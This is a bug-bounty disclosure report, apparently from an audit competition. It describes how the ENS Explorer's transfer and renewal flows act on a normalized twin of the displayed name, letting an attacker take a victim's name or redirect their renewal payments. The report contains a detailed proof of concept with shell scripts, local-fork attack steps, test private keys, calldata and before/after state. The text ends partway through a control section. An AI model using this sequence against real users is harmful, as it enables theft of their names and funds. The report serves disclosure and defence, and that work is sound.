# 89474 w a critical explorer transfer flow moves a different ens name than the one displayed stealing the victim s name

**Submitted on Aug 19th 2026 at 14:23:32 UTC by @Lun3x for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #89474
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Direct theft of user NFTs
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as:
    * resolving or rendering an ENS name to an attacker-controlled address
    * showing the wrong recipient or amount on a transaction the user then approves
  * Malicious interactions with an already-connected wallet, such as:
    * Modifying transaction arguments or parameters
    * Substituting contract addresses
    * Submitting malicious transactions
    * Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated)
    * Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

## Brief/Intro

`getLabel` normalizes a name before the transfer flow derives its registry token id. ENSv2 keys entries by the raw label string, so on any page whose name is not already normalized the flow addresses a different entry than the one displayed.

Executed 2026-08-19 against a Sepolia fork, driving the Explorer in Chrome. On `/PocCase22.eth/ownership/transfer` the app sent `setResolver(keccak("poccase22"), 0)` and `safeTransferFrom(victim, attacker, getTokenId(labelhash("poccase22")))`, both `status 0x1`. The victim's other name, `poccase22`, is now the attacker's with its resolver at `0x0`. `PocCase22` — the URL, the sidebar, and both step labels in the transaction modal — is untouched. The victim cannot get it back.

## Vulnerability Details

### The registry keys by the raw string

Normalizing before labelhash is correct for namehash-based resolution. `ETHRegistrar` and `PermissionedRegistry` take the label as a `string` and hash it themselves, so for registry addressing the normalized form is a different key, not a canonical one.

Read-only against the pinned registrar (`0xa88553F454b77203B0D036A05c894d555EAAa2Cc`, ensjs `ensEthRegistrar`, also in `packages/smart-account/src/providers/rhinestone/manifest.test.ts:56`):

```
isAvailable("TeStinG") = true       keccak("TeStinG") = 0xd5145d51…
isAvailable("testing") = false      keccak("testing") = 0x5f16f4c7…
```

Four live pairs on Sepolia have both Unicode composition forms of one label registered, `getState` status `2` on both sides, to different addresses:

| on-chain label (NFD) | owner             | normalized twin (NFC) | owner             |
| -------------------- | ----------------- | --------------------- | ----------------- |
| `ébf-f51f02a5`       | `0x13D7d726…D951` | different keccak      | `0x9aDaD7EC…FC3E` |
| `ébf-59bb0b6d`       | `0x13D7d726…D951` | different keccak      | `0xeA187F4D…256c` |
| `ébf-5559b1f7`       | `0x13D7d726…D951` | different keccak      | `0x4e1ED9cF…D1dA` |
| `ébf-fd20d09e`       | `0x13D7d726…D951` | different keccak      | `0xA533308d…9f8B` |

Both forms render identically. Nobody planted them.

### Where the substitution enters

`getLabel.ts` returns `ens_split(ens_normalize(name))[0]`, so `getLabel("PocCase22.eth")` is `"poccase22"`. Twelve call sites across ten files consume it. Four are the transfer flow:

| site                             | derives                                                      |
| -------------------------------- | ------------------------------------------------------------ |
| `useTransferName.ts:113`         | `getEnsTokenId({ label: getLabel(name) })` — the ERC-1155 id |
| `useTransferName.ts:132`         | the label for `detach-resolver` and `detach-registry`        |
| `useCanTransferName.ts:59`       | `hasRoles` — the gate that enables the button                |
| `useTransferDetachTargets.ts:60` | which detach options to show                                 |

`useCanTransferName.ts:20-24` states the equivalence the substitution breaks: *"resolves the role against `getResource(labelhash(label))`; that canonicalises to the same resource the contract checks via `hasRoles(tokenId, …)`, so the two agree."* They agree only when `getLabel` is the identity. In the run below the gate passed because the victim held the role on the substituted name.

`useTransferDetachTargets.ts:60-81` uses both names in one decision — `hasResolver` from `useNameResolverAddress({ name })` on the displayed name, `heldRoles` from `getLabel(name)` on the substituted one — then detaches the substituted one's resolver. Its comment says the check exists to avoid walking the user into "a partial, unrecoverable failure."

### Why the guard does not fire

`routes/$name/index.tsx:442` rejects un-normalized names and `isValidEnsName('PocCase22.eth')` is `false`. Of 16 non-test route files under `routes/$name/`, `index.tsx` has 2 occurrences and the other 15 have zero, `ownership/transfer.tsx` included. `routes/$name.tsx` references it only inside a TLD-redirect condition.

The profile page calls `PocCase22.eth` invalid. The transfer route one level down renders a form for it.

### The transfer, executed

Victim owns `poccase22`. Attacker registers `PocCase22` for the ordinary fee and `safeTransferFrom`s it to the victim — an ERC-1155 push to an EOA needs no consent. The victim opens the unwanted name to send it back and presses **Transfer name**.

```
0x4239…9bbe  block 11522309  setResolver(keccak("poccase22"), 0x0)               status 0x1
0xc847…20a9  block 11522310  safeTransferFrom(victim, attacker, tokenId, 1, "")  status 0x1
             tokenId = keccak("poccase22") with the low 32 bits cleared

BEFORE  ownerOf("poccase22") = 0xD3eFE59A…9fc5 (victim)     resolver 0x5239A812…
        ownerOf("PocCase22") = 0xD3eFE59A…9fc5 (victim)     resolver 0x5239A812…
AFTER   ownerOf("poccase22") = 0xc3457993…04AC (attacker)   resolver 0x0
        ownerOf("PocCase22") = 0xD3eFE59A…9fc5 (victim)     resolver 0x5239A812…
```

`keccak("PocCase22")` = `0xf71cc840…` is in neither payload. The modal labelled both steps *"Detach resolver - PocCase22.eth"* and *"Transfer name - PocCase22.eth"*; afterwards `/PocCase22.eth/ownership` shows **Owner `0xD3eF…9fc5`** and *"No recent activity"*.

Control, same browser session, only the case of the URL label changed: `/poccase23.eth/ownership/transfer` sent `keccak("poccase23")` and moved the displayed name. Reproduced on `poccase30`/`PocCase30`.

The flow takes its label from the URL; neither label existed in any indexer during the run.

### The renewal path

`apps/manager/src/features/dashboard/components/NamesTable.tsx:84-89`:

```ts
// Use the canonical normalized name for the on-chain label — the display name
// may be unnormalized (e.g. mixed case) and would hash to the wrong label.
const name = domain.normalizedName ?? displayName
return { displayName, label: name.replace(/\.eth$/i, ''), name, ... }
```

`displayName` keeps the real name for the row; `label` carries the substituted one into `renew()`. `isSelectableDomain` also runs on `normalizedName` and `isRenewableV2Domain` never queries the chain, so *Select all* includes such a row. Only labels ENSIP-15 accepts and maps are affected: rejected labels yield `null` and the `??` restores the raw name.

Through the real `NamesTable` (`__poc_case_renew.test.tsx`, 3 passed, with an already-normalized control):

```
row displayed        TeStinG.eth
label into renew()   "testing"
control alaska.eth   label "alaska"
```

`renew` bills the caller and is permissionless — the Manager ships `ThirdPartyRenewalDialog` for that case — so the call succeeds rather than reverting:

```
expiry("poccase24") attacker's : 1818682927 -> 1850218927   +31,536,000   paid by the victim
expiry("PocCase24") victim's   : 1818683049 -> 1818683049            0   still expiring
victim USDC                    :  967999916 ->  959999895      -8000021   = 8.000021 USDC

control, same victim, same call, the label they hold:
expiry("PocCase24") victim's   : 1818683049 -> 1850219049   +31,536,000   renewed
expiry("poccase24") attacker's : 1850218927 -> 1850218927            0   untouched
```

### Recovery

The victim's rescue attempt reverts:

```
safeTransferFrom(attacker, victim, tokenId("poccase22"), 1, "")
  -> ERC1155MissingApprovalForAll(0xD3eFE59A…9fc5, 0xc3457993…04AC)
  ownerOf("poccase22") after: 0xc3457993…04AC
```

No privileged override on the deployed registry: `owner()`, `admin()` and `DEFAULT_ADMIN_ROLE()` revert, and the selectors for `forceTransfer`, `adminTransfer`, `recover` and `setOwner` are absent from the deployed bytecode — with `setResolver(uint256,address)` present and a nonsense selector absent as controls.

`unregister(uint256)` is present and the registration lapses at expiry. Both belong to the current holder, and `renew` extends indefinitely. The form prints *"Transferring ownership of an ENS name is irreversible"* above itself.

### Why nobody noticed

`getLabel` is tested in isolation and the test asserts the lowercasing (`getLabel.test.ts:27-28`). `useTransferName`, `useCanTransferName`, `useTransferDetachTargets` and `toBulkRenewName` have no test file — zero hits across every `*.test.ts`/`*.test.tsx` in the repo. `features/transfer/` tests `setEthAddress` and `buildTransferPlan`, not the hooks that derive the label. `v2NameRoles.test.ts:43` fixtures the shape without connecting it: `makeDomain({ name: 'Alaska.eth', normalizedName: 'alaska.eth' })`.

### In the deployed builds

Re-fetched 2026-08-19. `explorer.ens.dev/assets/getLabel-DwFSWtPI.js` is 157 bytes and the whole chunk is `getLabel`; `useCanTransferName-BQ1QSnUv.js` imports it and feeds the result to `ROLE_CAN_TRANSFER_ADMIN`; `transfer-BFbGHt5B.js` imports it and carries all four step ids. `app.ens.dev/assets/dashboard-D924J0Sn.js` carries `Ur=e=>{…let n=e.normalizedName??t;return{displayName:t,label:n.replace(/\.eth$/i,``),…}}`.

## Impact Details

> **Critical** — "Direct theft of user NFTs"

An ERC-1155 the victim owns moved to an attacker-chosen address, executed through the application, with that name's resolver wiped first. The victim's only action was the app's own transfer flow on a different name. The same evidence satisfies three more published lines:

> **Critical** — "Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: … showing the wrong recipient or amount on a transaction the user then approves"

The incorrect detail is which name the transaction is for. Nothing in the interface shows the label being sent, and a wallet prompt for `safeTransferFrom` shows an opaque token id.

> **Critical** — "Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters"

The argument identifying the asset is not the one the interface represents; the attacker selects it by choosing which twin to register.

> **Critical** — "Direct theft of user funds"

8.000021 USDC per renewal, recurring annually. Reach limit for this arm is in **Limits**.

### Amount at risk

Figures are from a Sepolia fork, so the dollar amounts are not the size of this. The addressable set is every `.eth` label whose ENSIP-15 normalization is not the identity, held by anyone who opens the Explorer on it: unbounded, one registration fee to enter, with no validator, indexer or registry state in the way because the label comes from the URL. Loss per event on the theft arm is the whole name and its remaining term, against an attacker cost of one registration.

### Conditions checked that do not fit

* *"Hijacking or bricking an ENS name during a Manager flow (registration, v1 to v2 migration, or transfer)"* — not claimed: the transfer arm is the Explorer, and `apps/manager/src` has no transfer flow, only a `name-transferred` notification component.
* *"Taking down the application/website"* — nothing goes offline.
* *"Injection of malicious HTML or XSS through metadata"* — React escapes the string.
* *"Subdomain takeover"* — no DNS or hosting involved.

### Not a duplicate of the published known issues

`EXP-INPUT-005` covers name validators accepting *"homoglyphs, bidirectional-control and other control characters, and a single leading or trailing dot"*, Medium, with impact *"homograph-style display confusion in our UI rather than incorrect resolution."*

* No validator is in this path. All five sites run after validation, on a name the user already owns, with no user-typed input. Hardening `validateENSName` changes none of them.
* The Explorer's validator rejects the trigger: `isValidEnsName('PocCase22.eth')` is `false` and the profile route prints "Invalid name". The defect is that 15 sibling routes never ask.
* Neither trigger is on that list. Mixed-case ASCII and NFD-vs-NFC composition are not homoglyphs, bidi, control characters or stray dots.
* The consequence is an ERC-1155 leaving the wallet, not display confusion.

If the entry is read to cover the input class, the register's own carve-in applies: *"new consequences of a listed root cause that materially change its severity."*

`QA-03` is a display-only price mismatch, `QA-01` is role-combination errors after a transfer, `WEB-1301` is the address view. The repository's three commits are the fork point and two dependabot bumps; all commit messages searched for `normaliz|label|nfc|nfd|tokenid|renew` return nothing. No vendor source names this mechanism as of 2026-08-19.

### Limits

* **The normalization is intentional.** `getLabel`'s docstring cites "correct handling of Unicode, mixed-case, and label boundaries" and `getLabel.test.ts:27-28` asserts it. The defect is the use of that output as an ENSv2 registry identity.
* **The browser run used `VITE_USE_MOCK_WALLET=true`**, the repo's own e2e connector (`apps/portal/src/lib/mockWallet.mock.ts`, *"mirrors the setup in `ens-app-v3`"*), which replaces the wallet's Confirm click. The calldata in the receipts is what `useTransferName` built. No application source was modified; `git status --porcelain` on the review tree is empty.
* **The transfer arm needs the victim to hold both twins.** The executed route to that is the attacker's ERC-1155 push. The four live pairs show the two-owners state arising unprompted, not a victim holding both sides.
* **The renewal arm's input is currently filtered.** The deployed Manager names `staging-graphql.ens.dev`, whose `domains(...)` resolver defaults to `isNormalized: true`, and `documents/queries/Domains.graphql` never overrides it — so the deployed Manager cannot list an un-normalized name from it. `graphql.ens.dev` has no such default and returns `TeStinG.eth`/`testing.eth` under the same query shape. `VITE_INDEXER_GRAPHQL_URL` selects between them.
* **The five live rows share one owner** and are shaped like generated fixtures (`ébf-`, `éhca-`): evidence of the mechanism and how the state arises, not of a harmed customer.
* **Not permanent in the absolute.** The registration expires and the label becomes registrable. Neither that nor `unregister` is available to the victim.
* No transaction was sent to any public network. All writes target `127.0.0.1:8545`; live interactions are `cast call` and GraphQL queries.

## References

* `apps/portal/src/utils/token/getLabel.ts`; `getLabel.test.ts:27-28`
* `apps/portal/src/features/transfer/hooks/useTransferName.ts:113,132`
* `apps/portal/src/features/transfer/hooks/useCanTransferName.ts:20-24,59`
* `apps/portal/src/features/transfer/hooks/useTransferDetachTargets.ts:60-81`
* `apps/portal/src/features/transfer/helpers/transferToken.ts`; `detachNameResolver.ts`
* `apps/portal/src/features/renew/hooks/useRenewalTransactions.ts:191,197`
* `apps/portal/src/routes/$name/index.tsx:442,459`; `apps/portal/src/routes/$name.tsx:29`
* `apps/portal/src/utils/token/isNormalized.ts:39-57`
* `apps/manager/src/features/dashboard/components/NamesTable.tsx:76-92`
* `apps/manager/src/features/dashboard/v2NameRoles.test.ts:43`
* `apps/manager/src/routes/renew/$name.tsx:61`; `features/register-v2/utils/name-parser.ts:46`
* `packages/indexer/urql/client.ts:33`; `packages/indexer/documents/fragments/Domain.graphql:4`
* `@ensdomains/ensjs@e96662c` `actions/public/v2/getTokenId.ts`, `actions/wallet/v2/setResolver.ts`
* Sepolia `ETHRegistrar 0xa88553F4…2Cc`, `ETHRegistry 0xBDC85dD5…F0E2`, `MockUSDC 0x768F4245…7a39`, `PublicResolver 0x5239A812…3A9f` — ensjs `dist/clients/l1.js`, and `packages/smart-account/src/providers/rhinestone/manifest.test.ts:56-67`

## Proof of Concept

Executed 2026-08-19 against an anvil fork of Sepolia pinned at block **11522297**. Section 5 drives the running Explorer (`apps/portal`, `pnpm dev`) in Chrome; the transactions measured are the ones the application built and submitted. Every scenario has a one-variable control. The browser sequence was reproduced on a second, independent label pair (section 10).

No state-changing transaction was sent to any public network. All writes target `127.0.0.1:8545`; live interactions are `cast call` and GraphQL queries.

Environment: Node v22.15.0, pnpm 10.28.0, Foundry `cast`/`anvil` 1.7.1.

```bash
git clone --branch audit-comp-ready https://github.com/immunefi-team/audit-comp-ens repo
cd repo && git checkout 1c9b47f && pnpm install --frozen-lockfile
anvil --fork-url https://ethereum-sepolia-rpc.publicnode.com --fork-block-number 11522297 --port 8545
```

Two notes on the setup:

* The program lists audited commit `63772fd872af472ced58b009499355f3430c2a86`, which is not an object in this repository. It is the upstream `ensdomains/apps-monorepo` commit the fork was taken from (`cda79ac`, *"fork ensdomains/apps-monorepo at 63772fd8…"*). `git diff --stat cda79ac..1c9b47f` is four files, all dependency bumps, no source change. `1c9b47f` is the reproducible handle.
* Pin the fork block. Without `--fork-block-number`, the upstream node prunes state the fork later needs and reads on untouched accounts fail with `historical state … is not available`.

{% stepper %}
{% step %}

## Two variants of one label are two registry entries — live, read-only

```bash
REG=0xa88553F454b77203B0D036A05c894d555EAAa2Cc     # ensjs ensEthRegistrar
REGY=0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2    # ensjs ensRegistry
RPC=https://ethereum-sepolia-rpc.publicnode.com
for l in TeStinG testing Alice alice; do
  printf "%-10s isAvailable=%s\n" "$l" "$(cast call $REG 'isAvailable(string)(bool)' "$l" --rpc-url $RPC)"; done
cast keccak TeStinG; cast keccak testing
```

```
TeStinG    isAvailable=true
testing    isAvailable=false
Alice      isAvailable=true
alice      isAvailable=false
0xd5145d51e9bda4af61c38df5416ff9e6d397d12ddbcbdf825bbde7f53f46d25c
0x5f16f4c7f149ac4f9510d9cf8cf384038ad348b3bcdc01915f95de12df9d1b02
```

`getState` reports `TeStinG`/`Alice` as status `0` (unregistered) and `testing`/`alice` as status `1` (reserved for v1 migration).
{% endstep %}

{% step %}

## `getLabel`, run from inside its own package

```bash
cd apps/portal && node --input-type=module -e '
import {ens_normalize, ens_split} from "@adraffy/ens-normalize";
// verbatim from apps/portal/src/utils/token/getLabel.ts
function getLabel(name){ const n=ens_normalize(name); const l=ens_split(n); const f=l[0];
  if(!f||f.error) throw f?.error; return String.fromCodePoint(...f.input); }
for (const n of ["PocCase22.eth","poccase22.eth","TeStinG.eth"])
  console.log(`getLabel(${JSON.stringify(n)}) = ${JSON.stringify(getLabel(n))}`);'
```

```
getLabel("PocCase22.eth") = "poccase22"     <- substituted
getLabel("poccase22.eth") = "poccase22"     <- control: identity
getLabel("TeStinG.eth")   = "testing"
```

{% endstep %}

{% step %}

## Two owners of one label, live, with nobody having planted it

The deployed Manager names its indexer as a literal:

```bash
curl -s https://app.ens.dev/ | grep -ao '/assets/[A-Za-z0-9_.-]*\.js' | sort -u > chunks.txt   # 72
while read f; do h=$(curl -s "https://app.ens.dev$f" | grep -aoE '(staging-)?graphql\.ens\.dev' | sort -u | tr '\n' ' ')
  [ -n "$h" ] && echo "  $f -> $h"; done < chunks.txt
curl -s https://app.ens.dev/assets/general-CRfGw1jj.js | grep -ao '.\{40\}staging-graphql\.ens\.dev.\{40\}'
```

```
  /assets/general-CRfGw1jj.js -> staging-graphql.ens.dev
function Kn(){return`https://staging-graphql.ens.dev/`}var qn=Wn({url:Kn(),requestPolicy:`ne
```

Every row on it where the name is not normalized — 15 returned against a `first:1000` limit, so exhaustive:

```bash
curl -s -X POST https://staging-graphql.ens.dev/ -H 'Content-Type: application/json' \
  -d '{"query":"{domains(first:1000 where:{isNormalized:false}){name labelName normalizedName protocol expiryDate owner{id}}}"}'
```

```
15 rows
  normalizedName NULL (ENSIP-15 rejects; the ?? restores the raw name) : 10
      'ilona_marini.eth'  'furīraidā.eth'  'by_evgeny.eth'  're`new.eth'  'ravil_86.eth'
      'satanic_degen.eth'  'aevor_nox.eth'  'penzlyk_s.eth'  'mullvad_vpn.eth'
      'renew`-SECURITY-NOTICE-from-ENS-message-@ensrenewals-to-keep-this-name-`x.eth'
  normalizedName == name : 0
  normalizedName DIFFERS : 5
```

Positive control on the filter: the same query with `isNormalized:true` returns rows.

The five differ by Unicode composition, not case:

```
name           'éhca-1a016f8610f.eth'   codepoints ['0x65','0x301','0x68',…]   NFD
normalizedName 'éhca-1a016f8610f.eth'   codepoints ['0xe9','0x68','0x63',…]   NFC
rendered identically: True     utf8 bytes differ: True
```

On live Sepolia both forms are separate entries. `getState` field 1 is status, field 3 is owner:

```
--- ébf-f51f02a5 ---
   NFD  keccak=0x7aba36f49a5b… state=2 expiry=1818625728 owner=0x13D7d7267154D7712aF147F964226BC8D6B3D951
   NFC  keccak=0xc78b753b1fc9… state=2 expiry=1818625704 owner=0x9aDaD7ECDB9a481f66abcCa385d6E0B5E5E3FC3E
--- ébf-59bb0b6d ---
   NFD  keccak=0x9b42a1e7a533… state=2 owner=0x13D7d7267154D7712aF147F964226BC8D6B3D951
   NFC  keccak=0x7deb2acfbffa… state=2 owner=0xeA187F4DBf95f6043eD2Ee8114a614Cf1EEa256c
--- ébf-5559b1f7 ---
   NFD  keccak=0x9e8224ff3314… state=2 owner=0x13D7d7267154D7712aF147F964226BC8D6B3D951
   NFC  keccak=0x807f05f92ee7… state=2 owner=0x4e1ED9cFCbdB1cE589ED81f8099bAe935d5bD1dA
--- ébf-fd20d09e ---
   NFD  keccak=0x9b90cf2be5b2… state=2 owner=0x13D7d7267154D7712aF147F964226BC8D6B3D951
   NFC  keccak=0x0250eecf4c2a… state=2 owner=0xA533308d7c9e96a76Df37dcDe30Ad63639D69f8B
--- éhca-1a016f8610f ---
   NFD  keccak=0x0e42af7a26b2… state=2 owner=0x13D7d7267154D7712aF147F964226BC8D6B3D951
   NFC  keccak=0x0aa3f3885ac1… state=0 (unregistered)
```

All five are `protocol: v2`, parent `eth`, unexpired.

**Reach bound for the Manager arm.** The query above is not the query the Manager sends. Running its own document (`packages/indexer/documents/queries/Domains.graphql`, `where: { owner_in: [...] }`, `first: 200`) against the owner of those five:

```
rows returned: 5     rows where normalizedName != name: 0
  'bugfinder-live-4e66bb1c.eth'  'pay.registry-transfer-eb8afebb.eth'
  'registry-transfer-667a2441.eth'  'registry-transfer-90f1a285.eth'  'registry-transfer-f9c01c40.eth'
```

Control — the same `owner_in` filter with `isNormalized: false` added:

```
rows: 5
  'éhca-1a016f8610f.eth'  'ébf-f51f02a5.eth'  'ébf-59bb0b6d.eth'
  'ébf-5559b1f7.eth'  'ébf-fd20d09e.eth'      all owner 0x13d7d726…d951
```

So `staging-graphql.ens.dev` applies a default `isNormalized: true` to `domains(...)` and the Manager's document never overrides it. A full paginated sweep of that endpoint agrees and shows why an unfiltered count is the wrong instrument: 3,773 rows across 4 pages, 0 divergent, none of the five present.

`graphql.ens.dev` — the other live v2 indexer, older schema, no `isNormalized` in its filter type — has no such default. The Manager's exact query shape there:

```
where: {"owner_in":["0x205d2686da3bf33f64c17f21462c51b5ead462cf"]}
rows: 20   divergent: 1
    'TeStinG.eth' -> 'testing.eth'   expiry 1816340208
```

`VITE_INDEXER_GRAPHQL_URL` selects between them. The Explorer's transfer flow takes its label from the URL and needs no indexer row: in section 5 neither label exists in any indexer.
{% endstep %}

{% step %}

## Rig

`poc/lib_case.sh`. Fresh deterministic EOAs are required because every standard anvil account carries an EIP-7702 delegation on Sepolia (`cast code` returns `0xef0100386f…`), which fails the ERC-1155 receiver check.

```bash
export R=http://127.0.0.1:8545
export REGR=0xa88553F454b77203B0D036A05c894d555EAAa2Cc   # ETHRegistrar
export REGY=0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2   # ETHRegistry
export USDC=0x768F42455A2D082E23ceeF7d51e5787C82d67a39   # MockUSDC, mint() is permissionless
export RESOLVER=0x5239A812ec9A62F46dbb5de8f346C8eFe7553A9f
export ZERO=0x0000000000000000000000000000000000000000
export REF=0x0000000000000000000000000000000000000000000000000000000000000000
export DUR=31536000

# victim = the account apps/portal/.env.local connects the Explorer as
export VICTIM=0xD3eFE59AE7Cd70f39fB04C51a667fdD7F6F29fc5
export VPK=0x43f99b377cde991315bb8eb7502c11bf1b7e7a97138376aec7504023f8f9f31b
export APK=0x9d17bfa4c3a4d61e1d3b2e30a3ea3b3a41c0f5be22c9b3dd0d5cbb0a7f2e6c11
export ATTACKER=0xc3457993C71c57F791feFCe0f62C008B146104AC

st() { cast send --private-key "$1" --rpc-url "$R" "${@:2}" --json 2>/dev/null \
       | python3 -c 'import sys,json;print(json.load(sys.stdin).get("status","ERR"))'; }
cl() { cast call --rpc-url "$R" "$@" 2>&1 | head -1; }
tokid()       { cl $REGY 'getTokenId(uint256)(uint256)' "$(cast keccak "$1")" | awk '{print $1}'; }
owner_of()    { cl $REGY 'ownerOf(uint256)(address)'    "$(tokid "$1")"; }
resolver_of() { cl $REGY 'getResolver(string)(address)' "$1"; }
# expiry is getState field 2. There is no getExpiry(string); the ABI has getExpiry(uint256).
expiry_of()   { cast call $REGY 'getState(uint256)(uint32,uint64,address,uint256,uint256)' \
                "$(tokid "$1")" --rpc-url $R 2>/dev/null | sed -n 2p | awk '{print $1}'; }
usdc_of()     { cl $USDC 'balanceOf(address)(uint256)' "$1" | awk '{print $1}'; }

fund() { cast rpc anvil_setBalance "$2" 0xde0b6b3a7640000 --rpc-url "$R" >/dev/null
         st "$1" $USDC 'mint(address,uint256)' "$2" 1000000000 >/dev/null
         st "$1" $USDC 'approve(address,uint256)' $REGR 1000000000 >/dev/null; }

register() { local secret; secret=$(cast keccak "seed-$3")
  local cm; cm=$(cl $REGR 'makeCommitment(string,address,bytes32,address,address,uint64,bytes32)(bytes32)' \
        "$3" "$2" "$secret" $ZERO $RESOLVER $DUR $REF)
  st "$1" $REGR 'commit(bytes32)' "$cm" >/dev/null
  cast rpc evm_increaseTime 120 --rpc-url "$R" >/dev/null; cast rpc evm_mine --rpc-url "$R" >/dev/null
  st "$1" $REGR 'register(string,address,bytes32,address,address,uint64,address,bytes32)' \
        "$3" "$2" "$secret" $ZERO $RESOLVER $DUR $USDC $REF; }
```

Harness check on `expiry_of`, against an unregistered label:

```
expiry(poccase22)        = 1818682…   registered
expiry(nosuchlabel12345) = 0          unregistered reads 0, not an error
```

{% endstep %}

{% step %}

## The transfer, driven in Chrome

`poc/poc_case_setup.sh 22` plants the pair:

```bash
source poc/lib_case.sh
cast rpc anvil_autoImpersonateAccount true --rpc-url $R
fund $VPK $VICTIM; fund $APK $ATTACKER
register $VPK $VICTIM   poccase22      # 0x1   the victim's real name, resolver set at registration
register $APK $ATTACKER PocCase22      # 0x1   the attacker's twin
st $APK $REGY 'safeTransferFrom(address,address,uint256,uint256,bytes)' \
   $ATTACKER $VICTIM $(tokid PocCase22) 1 0x    # 0x1 — unilateral ERC-1155 push, no consent
```

Run the Explorer against the fork with the victim connected. `VITE_USE_MOCK_WALLET` is the repo's own e2e connector (`apps/portal/src/lib/mockWallet.mock.ts`, *"mirrors the setup in `ens-app-v3`"*); it forwards `eth_sendTransaction` as raw JSON-RPC, replacing the wallet's Confirm click.

```bash
cat > apps/portal/.env.local <<'ENV'
VITE_SEPOLIA_RPC_URL=/rpc
VITE_INDEXER_GRAPHQL_URL=http://127.0.0.1:5655/graphql
VITE_USE_MOCK_WALLET=true
VITE_MOCK_ACCOUNT=0xD3eFE59AE7Cd70f39fB04C51a667fdD7F6F29fc5
ENV
pnpm --filter portal dev --port 3001
```

`/rpc` is the dev server's proxy to `127.0.0.1:8545` (`apps/portal/vite.config.ts:22-26`). `5655` is `poc/indexer_proxy.mjs`, a read-only passthrough; the transfer flow does not query it and removing it does not change the result. `.env.local` matches `apps/portal/.gitignore:5` (`*.local`), so `git status --porcelain` on the review tree stays empty.

`poc/shoot_transfer_executed.mjs` performs the following and captures each frame:

1. Open `http://localhost:3001/PocCase22.eth/ownership/transfer`. Sidebar **PocCase22.eth**, heading **Transfer ownership**, the warning *"Transferring ownership of an ENS name is irreversible…"*, a **Recipient** field, **Transfer name** disabled.
2. Enter `0xc3457993C71c57F791feFCe0f62C008B146104AC`. A **Detach the resolver** toggle appears at `data-state="checked"` and **Transfer name** becomes enabled (`disabled: false`, read off the DOM). That is `useCanTransferName` finding `ROLE_CAN_TRANSFER_ADMIN` on `poccase22`.
3. Press **Transfer name**. Two-step modal: **Detach resolver**, **Transfer name**, both *Not Started*.
4. Press **Start**, then **Open wallet**. Both steps run. The rows read *"Detach resolver - PocCase22.eth"* and *"Transfer name - PocCase22.eth"* with completion ticks and a **Done** button.

State before:

```
ownerOf("poccase22") = 0xD3eFE59A…9fc5   resolver = 0x5239A812…53A9f
ownerOf("PocCase22") = 0xD3eFE59A…9fc5   resolver = 0x5239A812…53A9f
```

The two transactions the application submitted, read back off the chain:

```bash
for b in 11522309 11522310; do
  for tx in $(cast block $b --rpc-url $R --json | python3 -c 'import sys,json;print(" ".join(json.load(sys.stdin)["transactions"]))'); do
    cast tx $tx --rpc-url $R --json | python3 -c 'import sys,json;t=json.load(sys.stdin);print(t["hash"]);print("  from",t["from"],"to",t["to"]);print("  data",t["input"])'
    cast receipt $tx --rpc-url $R --json | python3 -c 'import sys,json;print("  status",json.load(sys.stdin)["status"])'
  done; done
```

```
0x42393692bdd828f428844de03241462f2871fc12002d30422cfdfa3306a49bbe
  from 0xd3efe59ae7cd70f39fb04c51a667fdd7f6f29fc5 to 0xbdc85dd5b15d7ecb354cd7cb6f2c50b4f2c4f0e2
  data 0xbc7b6d62 c6022ed0754f455370f24ed4e5389d8d64bd3e5ace5cf2042876ddbad947e33a 00…00
  status 0x1
0xc8478804a17fa2c606b44589d858f01ef4e92ee812c549233ecdc4ce8aaa20a9
  from 0xd3efe59ae7cd70f39fb04c51a667fdd7f6f29fc5 to 0xbdc85dd5b15d7ecb354cd7cb6f2c50b4f2c4f0e2
  data 0xf242432a 00…d3efe59ae7cd70f39fb04c51a667fdd7f6f29fc5 00…c3457993c71c57f791fefce0f62c008b146104ac
       c6022ed0754f455370f24ed4e5389d8d64bd3e5ace5cf2042876ddba00000000 …0001 …00a0 …0000
  status 0x1
```

Argument attribution, checked against the smallest case by hand:

```bash
cast sig 'setResolver(uint256,address)'                             # 0xbc7b6d62
cast sig 'safeTransferFrom(address,address,uint256,uint256,bytes)'  # 0xf242432a
cast keccak poccase22   # 0xc6022ed0754f455370f24ed4e5389d8d64bd3e5ace5cf2042876ddbad947e33a
cast keccak PocCase22   # 0xf71cc8408535022f9f89f21af0b8f9976fa2ae4003d9db75b04a8786c5bd0964
```

```
keccak("poccase22")                          0xc6022ed0…d947e33a
keccak("poccase22") & ~0xffffffff            0xc6022ed0…ddba00000000
safeTransferFrom tokenId argument            0xc6022ed0…ddba00000000   equal: True
registry getTokenId(labelhash("poccase22"))  0xc6022ed0…ddba00000000   equal: True
registry getTokenId(labelhash("PocCase22"))  0xd5968ccd…f91f00000000   equal: False
```

`keccak("PocCase22")` is in neither payload.

State after:

```
ownerOf("poccase22") = 0xc3457993…04AC   resolver = 0x0
ownerOf("PocCase22") = 0xD3eFE59A…9fc5   resolver = 0x5239A812…
```

`/PocCase22.eth/ownership` then reports **Owner `0xD3eF…9fc5`** and *"No recent activity"*, with the **Transfer** button still offered.

One incidental artefact from the first attempt, before anvil impersonation was enabled: the app's **Transaction Error** dialog rendered the payload it was trying to send, in the page, including `"data":"0xbc7b6d62c6022ed0754f455370f24ed4e5389d8d64bd3e5ace5cf2042876ddbad947e33a…"`. That is the only place in the Explorer's UI where the substituted label is visible.
{% endstep %}

{% step %}

## Control — same flow, same session, only the URL's case changed

Victim owns both `poccase23` and `PocCase23`. URL opened is the normalized one.

```
/poccase23.eth/ownership/transfer
  Transfer name enabled : true      Detach-the-resolver switch : checked   (identical to section 5)
  app sent setResolver(0x227117e4eccc13b347baf977f793629df21683810bcc1c9df4ff732ae9706036, 0x0)
           = keccak("poccase23")   [keccak("PocCase23") = 0x08ca2ac0…, absent]

BEFORE  ownerOf("poccase23") = victim   ownerOf("PocCase23") = victim
